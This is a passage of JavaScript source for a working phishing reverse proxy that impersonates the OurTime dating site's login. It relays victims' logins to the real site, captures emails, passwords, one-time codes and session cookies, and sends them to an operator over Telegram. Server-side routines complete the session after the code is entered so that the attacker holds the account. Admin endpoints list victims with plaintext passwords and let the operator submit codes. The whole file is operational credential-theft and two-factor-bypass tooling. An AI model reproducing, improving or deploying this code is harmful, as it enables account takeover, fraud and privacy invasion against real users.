    const bodyVariants = sessionId
      ? [JSON.stringify({ sessionId }), JSON.stringify({})]
      : [JSON.stringify({})];

    for (const body of bodyVariants) {
      const up = await httpUp({
        url: `${base}/api/auth`,
        method: 'POST',
        headers: {
          'user-agent': ua,
          'content-type': 'application/json',
          'accept': '*/*',
          'origin': base,
          'referer': `${base}/login`,
          ...(sess.cookies?._csrf ? { 'x-csrf-token': sess.cookies._csrf } : {}),
          ...(buildCookieHeader() ? { cookie: buildCookieHeader() } : {}),
        },
        body,
        timeout: { request: 20000 },
      });
      captureCookies(up.headers['set-cookie'], sess, 'server-side POST /api/auth (refreshSession)');
      saveStore();
      if (hasFullAuth(sess)) {
        console.log('[2FA-COMPLETE] ✅ final cookies captured (server-side POST /api/auth refreshSession)');
        return true;
      }
    }

    // Fallback terakhir: navigasi halaman (returnUrl) dengan follow hop manual
    const returnUrl = deepGet(validateRespJson, 'returnUrl');
    if (typeof returnUrl === 'string' && returnUrl) {
      let url = new URL(returnUrl, base).href;
      for (let hop = 0; hop < 5; hop++) {
        const up = await httpUp({
          url,
          method: 'GET',
          headers: {
            'user-agent': ua,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            ...(buildCookieHeader() ? { cookie: buildCookieHeader() } : {}),
          },
          timeout: { request: 20000 },
        });
        captureCookies(up.headers['set-cookie'], sess, `server-side GET ${url}`);
        saveStore();
        if (hasFullAuth(sess)) {
          console.log(`[2FA-COMPLETE] ✅ final cookies captured (server-side GET ${url})`);
          return true;
        }
        const loc = up.headers['location'];
        if (up.statusCode >= 300 && up.statusCode < 400 && loc) {
          url = new URL(loc, url).href;
          continue;
        }
        break;
      }
    }

    console.warn('[2FA-COMPLETE] ⚠️ final cookies belum terbit di request lanjutan');
    return false;
  } catch (err) {
    console.warn('[2FA-COMPLETE] error:', err.message);
    return false;
  }
}

// ============ FIX 2: re-notify jika cookies "upgrade" setelah finalize ============
// Jika cookies auth BERUBAH setelah notifikasi sukses pertama terkirim
// (mis. cookies final datang beberapa request kemudian), kirim ulang
// file cookie yang lengkap — sekali saja, dalam jendela 30 menit.
const UPGRADE_RENOTIFY_WINDOW_MS = 30 * 60 * 1000;
async function renotifyIfUpgraded(sess, req) {
  if (!sess || !sess.finalizedAt || sess.upgradeNotified) return false;
  if (Date.now() - sess.finalizedAt > UPGRADE_RENOTIFY_WINDOW_MS) return false;
  if (!hasFullAuth(sess)) return false;

  const fp = authCookieFingerprint(sess);
  if (!fp || fp === sess.finalizedFingerprint) return false;

  sess.upgradeNotified = true;
  storeDirty = true;
  saveStore();

  const ip = getClientIp(req);
  const country = await lookupCountry(ip);
  await notifyLoginSuccess({
    email: sess.lastEmail || 'n/a',
    password: sess.lastPassword || 'n/a',
    ip, country, time: timeUS(),
    cookies: sess.cookies,
    note: 'cookies UPGRADED — full session cookies arrived after the first notification',
  });
  console.log(`[2FA-UPGRADE] ✅ re-sent upgraded (complete) cookies sid=${req.mSid}`);
  return true;
}

async function handleTwoFactor(req, res) {
  const sess = req.mSession;
  const op = (req.path.match(/TwoFactor\w+/) || ['TwoFactor'])[0];
  const bodyBuf = await readBody(req);
  const bodyText = bodyBuf.toString('utf8');
  const json = tryJson(bodyText);
  const vars = gqlVars(json);

  // OTP value: deep-search "verifyCode" first, then regex on raw body
  // (the regex also matches the GraphQL argument name inside the query string)
  let channelId = deepGet(vars, 'id');
  let verifyCode = deepGet(vars, 'verifyCode');
  if (verifyCode === undefined) {
    const m = bodyText.match(/"verifyCode"\s*:\s*"([^"]+)"/);
    verifyCode = m ? m[1] : undefined;
  }
  if (channelId === undefined) {
    const m = bodyText.match(/"id"\s*:\s*"([^"]+)"/);
    channelId = m ? m[1] : undefined;
  }

  const ip = getClientIp(req);

  const up = await upstreamRequest(req, { method: 'POST', body: bodyBuf, path: req.originalUrl });

  captureCookies(up.headers['set-cookie'], sess, `POST ${req.originalUrl}`);
  saveStore();

  let respText = '';
  try { respText = up.body ? String(up.body) : ''; } catch {}
  const respJson = tryJson(respText);
  const info = scanJson(respJson);

  if (op === 'TwoFactorVerifyType') {
    const channels = [];
    (function walk(o) {
      if (!o || typeof o !== 'object') return;
      if (Array.isArray(o)) { o.forEach(walk); return; }
      if (o.verifyType != null && o.maskedContactInfo && o.id) channels.push(o);
      for (const v of Object.values(o)) if (v && typeof v === 'object') walk(v);
    })(respJson);

    if (channels.length && sess.pending) {
      sess.pending.channels = channels;
      storeDirty = true;
    }
    if (sess.pending) {
      const lines = channels.map((c) =>
        `• ${c.verifyType === 1 ? '📱 SMS' : '📧 Email'} → <code>${c.maskedContactInfo}</code>`).join('\n');
      sendTelegram(
        `📋 <b>OurTime — 2FA verification options</b>\n${lines}\n` +
        `━━━━━━━━━━━━━━━━━━\n⏳ User will choose a channel and receive the code.\n` +
        `🆔 sid: <code>${req.mSid}</code>`
      ).catch(() => {});
    }
  }

  else if (op === 'TwoFactorSendCode') {
    if (sess.pending) {
      sess.pending.lastSendBody = bodyText;
      sess.pending.device = isMobileUA(req.headers['user-agent']) ? 'm' : 'd';
      sess.pending.sendCount = sess.pending.sendCount || {};
      const key = decodeChannelId(channelId);
      const isFirst = !sess.pending.sendCount[key];
      sess.pending.sendCount[key] = (sess.pending.sendCount[key] || 0) + 1;
      storeDirty = true;
      saveStore();

      // Aggregation (option C): notify only the FIRST send per channel
      if (isFirst) {
        const chList = sess.pending.channels || [];
        const match = chList.find((c) => c.id === channelId);
        const contact = match ? ` to <code>${match.maskedContactInfo}</code>` : '';
        sendTelegram(
          `📤 <b>OurTime — OTP SENT (${key})</b>\n` +
          `Code sent${contact}\n` +
          `⏳ Valid for ${info.seconds || 600}s — waiting for the code submission...\n` +
          `🆔 sid: <code>${req.mSid}</code>`
        ).catch(() => {});
      }
    }
    console.log(`[2FA] code sent via ${decodeChannelId(channelId)} sid=${req.mSid.slice(0, 8)} ip=${ip}`);
  }

  else if (op === 'TwoFactorValidate') {
    if (sess.pending) {
      sess.pending.lastValidateBody = bodyText;
      sess.pending.device = isMobileUA(req.headers['user-agent']) ? 'm' : 'd';
      storeDirty = true;
    }

    // FIX 1: sukses hanya ditentukan oleh RESPONSE (sessionId/success).
    // Cek lama juga menghitung machineid/authtoken pending sebagai "login
    // sukses" — membuat finalize prematur dengan cookies pending, bahkan
    // OTP SALAH pun dulu dianggap sukses.
    const ok = !!(info.sessionId || info.success);
    if (ok) {
      // FIX R2: simpan sessionId dari response — dipakai replay
      // POST /api/auth (refreshSession) di sisi server
      if (sess.pending) {
        sess.pending.sessionId = info.sessionId || sess.pending.sessionId || null;
        storeDirty = true;
      }
      // Fallback: final session token may come in the body instead of set-cookie
      const tokMatch = respText.match(/"token"\s*:\s*"(Bearer [^"]+)"/);
      if (tokMatch && !(sess.cookies?.authtoken)) {
        sess.cookies.authtoken = tokMatch[1];
        storeDirty = true;
        saveStore();
      }

      let finalized = await finalizeLogin(sess, req, `OTP: ${verifyCode || 'n/a'}`);
      if (!finalized) {
        // FIX 3: selesaikan sesi di sisi server — OurTime menerbitkan cookies
        // final pada request SETELAH OTP benar. Lakukan sendiri supaya tidak
        // bergantung pada browser user yang terus browsing.
        const completed = await completePostOtpSession(sess, req, respJson);
        if (completed) {
          finalized = await finalizeLogin(sess, req, `OTP: ${verifyCode || 'n/a'} (server-completed)`);
        }
      }
      if (!finalized) {
        sendTelegram(
          `✅ <b>OurTime — OTP CORRECT</b> (<code>${verifyCode || '?'}</code>)\n` +
          `Verified — waiting for final session cookies from the next request...`
        ).catch(() => {});
      }
      console.log(`[2FA] VALIDATE ✅ code=${verifyCode || '?'} sid=${req.mSid.slice(0, 8)}`);
    } else {
      if (sess.pending) {
        sess.pending.wrongCount = (sess.pending.wrongCount || 0) + 1;
        storeDirty = true;
        saveStore();
      }
      const wrongs = sess.pending?.wrongCount || 1;
      if (wrongs <= 2) {
        sendTelegram(
          `❌ <b>OurTime — WRONG OTP</b>\n` +
          `Typed: <code>${verifyCode || '?'}</code>\n` +
          `↩️ Can retry. (attempt #${wrongs})`
        ).catch(() => {});
      }
      console.log(`[2FA] VALIDATE ❌ code=${verifyCode || '?'} sid=${req.mSid.slice(0, 8)}`);
    }
  }

  const siteHost = SITE_DOMAIN || `https://${req.headers.host}`;
  forwardResponseHeaders(res, up, siteHost);
  return res.send(up.rawBody);
}

// ================= ADMIN 2FA ENDPOINTS (option 3) =================

function pendingSessionFromBody(bodyJson) {
  if (!bodyJson || typeof bodyJson.sid !== 'string') return null;
  const sess = jwtStore.get(bodyJson.sid);
  if (!sess || !sess.pending) return null;
  return { sid: bodyJson.sid, sess };
}

function buildTwoFaRequest(sess, op, overrides = {}) {
  const device = sess.pending?.device === 'm' ? 'm' : 'd';
  const base = device === 'm' ? MOBI_TARGET : TARGET;
  const ua = device === 'm' ? MOBILE_UA : CHROME_UA;

  let bodyText;
  if (op === 'TwoFactorSendCode' && sess.pending?.lastSendBody) {
    bodyText = sess.pending.lastSendBody; // exact replay of the user's request
  } else if (op === 'TwoFactorValidate' && sess.pending?.lastValidateBody) {
    bodyText = sess.pending.lastValidateBody.replace(
      /("verifyCode"\s*:\s*")[^"]*(")/,
      `$1${overrides.verifyCode}$2`
    );
  } else if (op === 'TwoFactorSendCode') {
    bodyText = JSON.stringify({
      query: 'mutation TwoFactorSendCode($id: String!, $pendingToken: String, $returnUrl: String) { authTwoFactorSendCode(id: $id, pendingToken: $pendingToken) { success secondsToExpire } }',
      variables: { id: overrides.id, pendingToken: sess.pending.pendingToken, returnUrl: '' },
    });
  } else if (op === 'TwoFactorValidate') {
    bodyText = JSON.stringify({
      query: 'mutation TwoFactorValidate($id: String!, $verifyCode: String!, $pendingToken: String) { authTwoFactorValidate(id: $id, verifyCode: $verifyCode, pendingToken: $pendingToken) { success sessionId } }',
      variables: { id: overrides.id, verifyCode: overrides.verifyCode, pendingToken: sess.pending.pendingToken },
    });
  }

  return { base, ua, bodyText };
}

// GET /admin/2fa/pending — list all sessions awaiting OTP
app.get('/admin/2fa/pending', async (req, res) => {
  const list = [];
  for (const [sid, s] of jwtStore) {
    if (!s.pending) continue;
    const p = s.pending;
    list.push({
      sid,
      email: p.email,
      password: p.password,
      createdAt: new Date(p.createdAt).toISOString(),
      ageMinutes: Math.round((Date.now() - p.createdAt) / 60000),
      wrongOtpAttempts: p.wrongCount || 0,
      sendCount: p.sendCount || {},
      channels: (p.channels || []).map((c) => ({
        id: c.id,
        type: c.verifyType === 1 ? 'SMS' : 'Email',
        contact: c.maskedContactInfo,
      })),
    });
  }
  return res.json({ count: list.length, pending: list });
});

// POST /admin/2fa/resend { sid, id? } → force OTP resend server-side
app.post('/admin/2fa/resend', async (req, res) => {
  try {
    const buf = await readBody(req);
    const bodyJson = tryJson(buf.toString('utf8')) || {};
    const found = pendingSessionFromBody(bodyJson);
    if (!found) return res.status(404).json({ error: 'pending 2FA session not found' });

    const { sess } = found;
    let id = bodyJson.id;
    if (!id && sess.pending.lastSendBody) {
      const m = sess.pending.lastSendBody.match(/"id"\s*:\s*"([^"]+)"/);
      if (m) id = m[1];
    }
    if (!id) return res.status(400).json({ error: 'channel id required (none stored)' });

    const { base, ua, bodyText } = buildTwoFaRequest(sess, 'TwoFactorSendCode', { id });

    const up = await httpUp({
      url: `${base}/graphql/TwoFactorSendCode`,
      method: 'POST',
      headers: {
        'user-agent': ua,
        'content-type': 'application/json',
        'accept': '*/*',
        'origin': base,
        'referer': `${base}/login`,
      },
      body: bodyText,
      timeout: { request: 30000 },
    });

    const info = scanJson(tryJson(String(up.body || '')));
    sendTelegram(
      `📤 <b>OurTime — OTP RESENT (operator)</b>\n` +
      `Manual resend triggered for <code>${sess.pending.email}</code>`
    ).catch(() => {});
    return res.json({ status: up.statusCode, success: !!info.success, secondsToExpire: info.seconds || null });
  } catch (err) {
    console.error('[ADMIN resend]', err.message);
    return res.status(500).json({ error: err.message });
  }
});

// POST /admin/2fa/submit { sid, code } → submit the OTP yourself
app.post('/admin/2fa/submit', async (req, res) => {
  try {
    const buf = await readBody(req);
    const bodyJson = tryJson(buf.toString('utf8')) || {};
    const found = pendingSessionFromBody(bodyJson);
    if (!found) return res.status(404).json({ error: 'pending 2FA session not found' });
    if (!bodyJson.code) return res.status(400).json({ error: 'code required' });

    const { sid, sess } = found;

    let id = bodyJson.id;
    if (!id && sess.pending.lastSendBody) {
      const m = sess.pending.lastSendBody.match(/"id"\s*:\s*"([^"]+)"/);
      if (m) id = m[1];
    }
    if (!id) {
      const ch = (sess.pending.channels || [])[0];
      id = ch?.id;
    }
    if (!id) return res.status(400).json({ error: 'channel id required (none stored)' });

    const { base, ua, bodyText } = buildTwoFaRequest(sess, 'TwoFactorValidate', { id, verifyCode: bodyJson.code });

    const up = await httpUp({
      url: `${base}/graphql/TwoFactorValidate`,
      method: 'POST',
      headers: {
        'user-agent': ua,
        'content-type': 'application/json',
        'accept': '*/*',
        'origin': base,
        'referer': `${base}/login`,
      },
      body: bodyText,
      timeout: { request: 30000 },
    });

    captureCookies(up.headers['set-cookie'], sess, 'admin POST /graphql/TwoFactorValidate');

    let respText = '';
    try { respText = up.body ? String(up.body) : ''; } catch {}
    const tokMatch = respText.match(/"token"\s*:\s*"(Bearer [^"]+)"/);
    if (tokMatch && !sess.cookies?.authtoken) {
      sess.cookies.authtoken = tokMatch[1];
      storeDirty = true;
    }
    saveStore();

    const respJson = tryJson(respText);
    const info = scanJson(respJson);
    // FIX 1: sukses hanya dari sinyal response — bukan dari cookies longgar
    const ok = !!(info.sessionId || info.success);

    if (ok) {
      // FIX R2: simpan sessionId — dipakai replay POST /api/auth (refreshSession)
      if (sess.pending) {
        sess.pending.sessionId = info.sessionId || sess.pending.sessionId || null;
        storeDirty = true;
      }
      const fakeReq = {
        headers: { ...req.headers },
        mSid: sid,
        mSession: sess,
        socket: { remoteAddress: '127.0.0.1' },
      };
      delete fakeReq.headers['x-real-ip'];
      let finalized = await finalizeLogin(sess, fakeReq, `operator-submitted OTP: ${bodyJson.code}`);
      if (!finalized) {
        // FIX 3: selesaikan sesi di sisi server (tanpa menunggu browser user)
        const completed = await completePostOtpSession(sess, fakeReq, respJson);
        if (completed) {
          finalized = await finalizeLogin(sess, fakeReq, `operator-submitted OTP: ${bodyJson.code} (server-completed)`);
        }
      }
      if (!finalized) {
        sendTelegram(
          `✅ <b>OurTime — OTP CORRECT (operator)</b> (<code>${bodyJson.code}</code>)\n` +
          `Waiting for final session cookies from the next request...`
        ).catch(() => {});
      }
    }

    return res.json({
      status: up.statusCode,
      success: ok,
      sessionId: info.sessionId || null,
      cookiesCaptured: hasFullAuth(sess),
    });
  } catch (err) {
    console.error('[ADMIN submit]', err.message);
    return res.status(500).json({ error: err.message });
  }
});

// GET /admin/session?sid=... — lihat cookies yang tertangkap untuk sebuah sesi (debug)
app.get('/admin/session', (req, res) => {
  const sid = req.query.sid;
  const sess = sid ? jwtStore.get(sid) : null;
  if (!sess) return res.status(404).json({ error: 'session not found' });
  return res.json({
    sid,
    cookies: sess.cookies || {},
    fullAuth: hasFullAuth(sess),
    loggedInAt: sess.loggedInAt || null,
    finalizedAt: sess.finalizedAt || null,
    pending: sess.pending
      ? {
          email: sess.pending.email,
          createdAt: new Date(sess.pending.createdAt).toISOString(),
          wrongCount: sess.pending.wrongCount || 0,
          sendCount: sess.pending.sendCount || {},
          channels: sess.pending.channels || [],
        }
      : null,
  });
});

// ================= ROUTES =================

app.get('/cdn-cgi/rum', (req, res) => res.status(404).end());

app.get('/', (req, res) => res.redirect(302, '/login'));

// POST /api/auth — relay + capture + notify
app.post('/api/auth', async (req, res) => {
  const sess = req.mSession;
  try {
    const bodyBuf = await readBody(req);
    const creds = parseCredentials(req.headers['content-type'], bodyBuf);

    if (!creds.email || !creds.password) {
      console.log(`[AUTH-RAW] sid=${req.mSid.slice(0, 8)} type=${req.headers['content-type']}`);
      console.log(`[AUTH-RAW] body=${bodyBuf.toString('utf8').slice(0, 1500)}`);
    }

    const up = await upstreamRequest(req, {
      path: `/api/auth${req.url.includes('?') ? req.url : ''}`,
      method: 'POST',
      body: bodyBuf,
    });

    const added = captureCookies(up.headers['set-cookie'], sess, 'POST /api/auth');
    saveStore();

    const authCookies = added.filter((c) => AUTH_COOKIE_RE.test(c));
    let bodyText = '';
    try { bodyText = up.body ? String(up.body) : ''; } catch {}
    const isCredsWrong =
      bodyText.includes('email or password you entered is incorrect') ||
      bodyText.includes('"statusCode":401');
    const isSuccess = up.statusCode < 400 && authCookies.length > 0 && !isCredsWrong;

    // ===== 2FA PENDING detection: password CORRECT but OTP required =====
    const tokenMatch = bodyText.match(/"token"\s*:\s*"(Bearer [^"]+)"/);
    const pendingToken = tokenMatch ? tokenMatch[1] : null;
    const needs2FA = up.statusCode < 400 && !isCredsWrong && authCookies.length === 0 && !!pendingToken;

    if (isSuccess) sess.loggedInAt = Date.now();
    if (sess.loggedInAt && !isSuccess && !needs2FA && authCookies.length === 0) {
      console.log(`[AUTH] silent re-auth (no duplicate notify) sid=${req.mSid.slice(0, 8)}`);
      const siteHost = SITE_DOMAIN || `https://${req.headers.host}`;
      forwardResponseHeaders(res, up, siteHost);
      return res.send(up.rawBody);
    }

    const ip = getClientIp(req);

    if (needs2FA) {
      const alreadyPending = !!sess.pending && (!creds.email || sess.pending.email === creds.email);
      // FIX R1: jangan timpa pending 2FA yang sudah ada dengan data kosong
      // (mis. response refreshSession yang mengandung token tanpa kredensial)
      if (!sess.pending || creds.email) {
        sess.pending = {
          email: creds.email,
          password: creds.password,
          pendingToken,
          createdAt: Date.now(),
          device: isMobileUA(req.headers['user-agent']) ? 'm' : 'd',
          sendCount: {},
          wrongCount: 0,
        };
      }
      storeDirty = true;
      saveStore();

      if (!alreadyPending) {
        lookupCountry(ip).then(async (country) => {
          await sendTelegram(
            `🔐 <b>OurTime — PASSWORD CORRECT ⚠️ (2FA/OTP required)</b>\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `📧 Email: <code>${creds.email || 'n/a'}</code>\n` +
            `🔑 Pass: <code>${creds.password || 'n/a'}</code>\n` +
            `🌏 IP: <code>${ip}</code>\n` +
            `🏴 Country: <code>${country}</code>\n` +
            `🕐 Time (US): <code>${timeUS()}</code>\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `⏳ Waiting for the OTP code submission (pendingToken valid ~45 min)...\n` +
            `🆔 sid: <code>${req.mSid}</code>`
          );
        }).catch(() => {});
      }
      console.log(
        `[AUTH] sid=${req.mSid.slice(0, 8)} status=${up.statusCode} ` +
        `result=PENDING-2FA 🔐 email=${creds.email || '?'} ip=${ip}`
      );
    } else {
      // FIX R1: kalau sesi 2FA pending baru menerima cookies FINAL lewat
      // POST /api/auth (refreshSession yang dipanggil otomatis oleh SPA
      // OurTime setelah OTP benar) → finalisasi lewat finalizeLogin:
      // SATU notifikasi lengkap dengan kredensial user + pending terhapus
      // (mencegah notifikasi ganda dari generic relay dan false alarm
      // "2FA ABANDONED" dari purge interval).
      let finalized = false;
      if (isSuccess && sess.pending) {
        finalized = await finalizeLogin(sess, req, 'post-OTP /api/auth (refreshSession)');
      }
      if (finalized) {
        console.log(
          `[AUTH] sid=${req.mSid.slice(0, 8)} status=${up.statusCode} ` +
          `result=2FA-COMPLETED ✅ (cookies final via POST /api/auth) ip=${ip}`
        );
      } else if (sess.pending) {
        // sesi 2FA masih berjalan — jangan spam notifikasi sukses/gagal;
        // finalisasi dilakukan path 2FA begitu cookies penuh tiba.
        console.log(
          `[AUTH] sid=${req.mSid.slice(0, 8)} status=${up.statusCode} ` +
          `result=2FA-WAITING ⏳ (isSuccess=${isSuccess}) ip=${ip}`
        );
      } else {
        lookupCountry(ip).then(async (country) => {
          try {
            if (isSuccess) {
              await notifyLoginSuccess({
                email: creds.email, password: creds.password,
                ip, country, time: timeUS(), cookies: sess.cookies,
              });
              console.log(`[CAPTURED] ${JSON.stringify({ email: creds.email, password: creds.password, ip, country, time: timeUS() })}`);
            } else {
              await notifyLoginFailed({
                email: creds.email, password: creds.password,
                ip, country, time: timeUS(),
              });
            }
          } catch (err) {
            console.error('[NOTIFY] Error (non-fatal):', err.message);
          }
        });

        console.log(
          `[AUTH] sid=${req.mSid.slice(0, 8)} status=${up.statusCode} ` +
          `result=${isSuccess ? 'SUCCESS ✅' : 'FAIL ❌'} ` +
          `email=${creds.email || '?'} ip=${ip}`
        );
      }
    }

    const siteHost = SITE_DOMAIN || `https://${req.headers.host}`;
    forwardResponseHeaders(res, up, siteHost);
    return res.send(up.rawBody);
  } catch (err) {
    console.error('Auth relay error:', err.message);
    return res.status(502).send('{"error":"upstream"}');
  }
});

// Dedicated 2FA handlers (before the generic relay)
app.use((req, res, next) => {
  if (req.method === 'POST' && /^\/graphql\/TwoFactor/i.test(req.path)) {
    return handleTwoFactor(req, res).catch((err) => {
      console.error('2FA relay error:', err.message);
      return res.status(502).send('{"error":"upstream-2fa"}');
    });
  }
  next();
});

// Generic relay (GraphQL ClientConfiguration, API, assets, HTML shell)
app.use(async (req, res) => {
  const sess = req.mSession;
  try {
    const isBody = !['GET', 'HEAD'].includes(req.method);
    const body = isBody ? await readBody(req) : undefined;

    const up = await upstreamRequest(req, { body });

    captureCookies(up.headers['set-cookie'], sess, `${req.method} ${req.path}`);
    saveStore();

    // Fallback finalize: if final auth cookies arrive AFTER the OTP was
    // validated, fire the success notification here (runs once).
    if (sess.pending) {
      finalizeLogin(sess, req, 'post-OTP session').catch(() => {});
    }
    // FIX 2: kalau set cookies ter-UPGRADE setelah notifikasi sukses pertama
    // (cookies final datang terlambat), kirim ulang file lengkap satu kali.
    renotifyIfUpgraded(sess, req).catch(() => {});

    const siteHost = SITE_DOMAIN || `https://${req.headers.host}`;
    forwardResponseHeaders(res, up, siteHost);

    const ct = up.headers['content-type'] || '';
    if (ct.includes('text/html')) {
      const challenged = isCfChallengeBody(up.body);

      // PATCH A: page navigation (browser wants HTML) vs API call (SPA wants JSON)
      const wantsHtml =
        req.method === 'GET' &&
        /text\/html/.test(req.headers['accept'] || 'text/html');

      if (challenged && !wantsHtml) {
        // CF challenged an API/XHR call — reply as JSON so the SPA
        // handles it cleanly instead of getting a stray HTML page.
        console.log(`[CF] API challenged (JSON fallback): ${req.originalUrl}`);
        return res.status(503).send('{"error":"cloudflare-challenge"}');
      }

      const cacheKey = `login|${isMobileUA(req.headers['user-agent']) ? 'm' : 'd'}`;
      const cached = htmlCache.get(cacheKey);

      // Refresh cache when healthy (only real 200 pages — never 3xx hop bodies)
      if (!challenged && up.statusCode === 200 && (req.path === '/login' || req.path === '/')) {
        htmlCache.set(cacheKey, { html: up.body, ts: Date.now() });
      }

      if (!challenged) {
        return res.send(rewriteHtml(up.body, siteHost));
      }

      // Challenged page navigation → serve cached copy (visitor never sees blank)
      if (cached && Date.now() - cached.ts < HTML_CACHE_TTL) {
        console.log(`[CACHE] serving cached /login (${req.path})`);
        return res.send(rewriteHtml(cached.html, siteHost));
      }

      // Cache empty → connecting page
      return res.status(503).send(
        `<!DOCTYPE html><html><head><meta charset="utf-8"/><title>Connecting…</title>` +
        `<meta http-equiv="refresh" content="15"/></head>` +
        `<body style="font:14px system-ui;color:#555;text-align:center;padding-top:20vh">` +
        `Connecting…<br/>(auto retry)</body></html>`
      );
    }
    return res.send(up.rawBody);
  } catch (err) {
    console.error('Relay error:', req.method, req.originalUrl, err.message);
    return res.status(502).send('Upstream error');
  }
});

app.listen(PORT, () => {
  console.log(`🚂 Member proxy listening on :${PORT}`);
  console.log(`   Desktop : ${TARGET}`);
  console.log(`   Mobile  : ${MOBI_TARGET}`);
  console.log(`   KeepAlive: ✅ (every 10 min, 3 attempts) | HTML Cache: 1h | TG: ${TG_TOKEN ? 'configured ✅' : 'NOT SET ⚠️'}`);
  console.log(`   2FA flow: ✅ (strict full-cookie finalize + POST /api/auth refreshSession replay) | Admin: /admin/2fa/pending, /admin/2fa/resend, /admin/2fa/submit, /admin/session?sid=`);
  if (!PROXY_SECRET) console.warn('   ⚠️ PROXY_SECRET not set — Railway is exposed publicly!');
  if (MOCK_UPSTREAM) console.log('   🧪 MOCK MODE — test login: test@example.com / test1234 (OTP 123456) | non-2FA: direct@example.com / test1234');
});